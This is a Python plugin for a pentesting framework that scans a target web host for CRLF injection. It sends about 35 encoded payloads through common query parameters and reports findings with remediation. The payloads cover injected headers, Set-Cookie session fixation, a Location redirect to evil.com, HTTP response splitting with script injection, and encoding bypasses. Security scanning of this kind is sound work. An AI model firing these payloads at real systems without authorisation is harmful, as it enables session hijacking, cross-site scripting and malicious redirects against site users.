"""CRLF injection detection — header injection, response splitting, session fixation.

Checks for:
1. CRLF via %0d%0a in various parameters
2. Unicode CRLF variants
3. Double encoding bypass
4. Header injection → XSS escalation
5. Session fixation via Set-Cookie injection
"""

from __future__ import annotations

import logging
from typing import ClassVar
from urllib.parse import quote

from basilisk.core.plugin import BasePlugin, PluginCategory, PluginMeta
from basilisk.models.result import Finding, PluginResult
from basilisk.models.target import Target

logger = logging.getLogger(__name__)

CRLF_MARKER = "X-CRLF-Test"

# CRLF payloads — inject a custom header
CRLF_PAYLOADS: list[tuple[str, str]] = [
    # Standard CRLF (%0d%0a)
    (f"%0d%0a{CRLF_MARKER}:%20injected", "basic_crlf"),
    (f"%0D%0A{CRLF_MARKER}:%20injected", "uppercase_crlf"),
    # LF-only (%0a)
    (f"%0a{CRLF_MARKER}:%20injected", "lf_only"),
    # CR-only (%0d)
    (f"%0d{CRLF_MARKER}:%20injected", "cr_only"),
    # XSS via response splitting
    ("%0d%0a%0d%0a<script>alert(1)</script>", "crlf_xss"),
    ("%0a%0a<script>alert(1)</script>", "lf_xss"),
    # Session fixation
    ("%0d%0aSet-Cookie:basilisk=pwned", "session_fixation"),
    ("%0aSet-Cookie:basilisk=pwned", "session_fixation_lf"),
    ("%0d%0aSet-Cookie:basilisk=pwned;Path=/;HttpOnly", "session_fixation_full"),
    # Unicode CRLF (UTF-8 encoded CR/LF)
    (f"%E5%98%8A%E5%98%8D{CRLF_MARKER}:%20injected", "unicode_crlf"),
    # Redirect injection
    ("%0d%0aLocation:https://evil.com", "crlf_redirect"),
    ("%0aLocation:https://evil.com", "crlf_redirect_lf"),
    # Response splitting — full HTTP response injection
    ("%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1 200 OK", "response_split"),
    (
        "%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type:text/html%0d%0a%0d%0a"
        "<html>injected</html>",
        "response_split_full",
    ),
    # Header manipulation
    ("%0d%0aX-XSS-Protection:0", "crlf_header_disable"),
    ("%0d%0aAccess-Control-Allow-Origin:%20*", "crlf_cors"),
    ("%0d%0aContent-Type:%20text/html", "crlf_content_type"),
    ("%0d%0aX-Forwarded-For:%20127.0.0.1", "crlf_xff"),
    # Double URL encoding
    (f"%250d%250a{CRLF_MARKER}:%20injected", "double_encode_crlf"),
    (f"%250a{CRLF_MARKER}:%20injected", "double_encode_lf"),
    # Triple URL encoding
    (f"%25250d%25250a{CRLF_MARKER}:%20injected", "triple_encode_crlf"),
    # Space / whitespace variations
    (f"%0d%20%0a{CRLF_MARKER}:%20injected", "space_between"),
    (f"%0d%0a%20{CRLF_MARKER}:%20injected", "leading_space"),
    (f"%0d%0a%09{CRLF_MARKER}:%20injected", "leading_tab"),
    # Unicode escape sequences
    (f"%u000d%u000a{CRLF_MARKER}:%20injected", "unicode_escape"),
    # Overlong UTF-8 encoding
    (f"%c0%8d%c0%8a{CRLF_MARKER}:%20injected", "overlong_utf8"),
    # Literal escape sequences (some servers interpret them)
    (f"\\r\\n{CRLF_MARKER}:%20injected", "literal_escape"),
    (f"\\n{CRLF_MARKER}:%20injected", "literal_lf"),
    # Null byte prefix
    (f"%00%0d%0a{CRLF_MARKER}:%20injected", "null_byte_crlf"),
    (f"%00%0a{CRLF_MARKER}:%20injected", "null_byte_lf"),
    # Backslash-encoded (\x0d\x0a)
    (f"\\x0d\\x0a{CRLF_MARKER}:%20injected", "hex_escape"),
    # Mixed encoding
    (f"%5cr%5cn{CRLF_MARKER}:%20injected", "encoded_backslash_rn"),
    # UTF-16 / wide-char CRLF
    (f"\\u000d\\u000a{CRLF_MARKER}:%20injected", "utf16_escape"),
    # Multiple CRLF (header padding)
    (f"%0d%0a%0d%0a%0d%0a{CRLF_MARKER}:%20injected", "multi_crlf"),
]

# Parameters to test
CRLF_PARAMS = [
    "url", "redirect", "return", "next", "callback",
    "name", "lang", "locale", "view", "page",
    "host", "ref", "site", "path",
]

# Paths to test
SCAN_PATHS = ["/", "/login", "/redirect", "/search", "/api"]


class CrlfInjectionPlugin(BasePlugin):
    meta: ClassVar[PluginMeta] = PluginMeta(
        name="crlf_injection",
        display_name="CRLF Injection Scanner",
        category=PluginCategory.PENTESTING,
        description=(
            "Detects CRLF injection for header injection, "
            "response splitting, session fixation, and XSS"
        ),
        produces=["crlf_findings"],
        timeout=30.0,
    )

    async def run(self, target: Target, ctx) -> PluginResult:
        if ctx.http is None:
            return PluginResult.fail(
                self.meta.name, target.host, error="HTTP client not available",
            )

        from basilisk.utils.http_check import resolve_base_url

        findings: list[Finding] = []
        tested: list[dict] = []

        base_url = await resolve_base_url(target.host, ctx)
        if not base_url:
            return PluginResult.success(
                self.meta.name, target.host,
                findings=[Finding.info("Host not reachable")],
                data={"crlf_tests": []},
            )

        for path in SCAN_PATHS:
            if ctx.should_stop or len(findings) >= 3:
                break

            # Fetch baseline headers for comparison
            baseline_headers: dict[str, str] = {}
            try:
                async with ctx.rate:
                    baseline_resp = await ctx.http.get(
                        f"{base_url}{path}?test=clean",
                        timeout=8.0, allow_redirects=False,
                    )
                    baseline_headers = {
                        k.lower(): v for k, v in baseline_resp.headers.items()
                    }
            except Exception as e:
                logger.debug("crlf_injection: %s", e)

            for param in CRLF_PARAMS:
                if ctx.should_stop or len(findings) >= 3:
                    break

                for payload, label in CRLF_PAYLOADS:
                    if ctx.should_stop:
                        break

                    url = f"{base_url}{path}?{param}={quote(payload, safe='%')}"
                    try:
                        async with ctx.rate:
                            resp = await ctx.http.get(
                                url, timeout=8.0, allow_redirects=False,
                            )
                    except Exception as e:
                        logger.debug("crlf_injection: %s", e)
                        continue

                    headers = dict(resp.headers)
                    header_str = str(headers).lower()
                    # Compare with baseline: find NEW headers
                    new_headers = {
                        k.lower() for k in resp.headers
                    } - set(baseline_headers.keys())

                    is_crlf = False
                    severity_fn = Finding.medium
                    desc = "CRLF injection"
                    injected_header = ""

                    if CRLF_MARKER.lower() in header_str:
                        is_crlf = True
                        desc = f"CRLF header injection ({label})"
                        severity_fn = Finding.high
                        injected_header = CRLF_MARKER

                    elif "basilisk=pwned" in header_str:
                        is_crlf = True
                        desc = f"CRLF session fixation ({label})"
                        severity_fn = Finding.high
                        injected_header = "Set-Cookie: basilisk=pwned"

                    # Check for XSS via response splitting
                    if not is_crlf and "xss" in label:
                        try:
                            body = await resp.text(
                                encoding="utf-8", errors="replace",
                            )
                            if "<script>alert(1)</script>" in body:
                                is_crlf = True
                                desc = f"CRLF → XSS ({label})"
                                severity_fn = Finding.critical
                        except Exception as e:
                            logger.debug("crlf_injection: %s", e)

                    if is_crlf:
                        tested.append({
                            "path": path, "param": param,
                            "payload": payload, "label": label,
                        })
                        findings.append(severity_fn(
                            f"{desc}: {path}?{param}=",
                            description=(
                                f"CRLF injection via {label}. "
                                "Attacker can inject arbitrary HTTP headers."
                            ),
                            evidence=(
                                f"URL: {url}\n"
                                f"Injected header: {injected_header}\n"
                                f"New headers in response: "
                                f"{', '.join(sorted(new_headers)) or 'N/A'}"
                            ),
                            remediation=(
                                "Strip CR/LF characters from all user input. "
                                "Use framework-provided redirect functions."
                            ),
                            tags=["pentesting", "crlf", label],
                        ))
                        break  # One per param

        if not findings:
            findings.append(Finding.info(
                "No CRLF injection detected",
                tags=["pentesting", "crlf"],
            ))

        return PluginResult.success(
            self.meta.name, target.host,
            findings=findings,
            data={"crlf_tests": tested},
        )
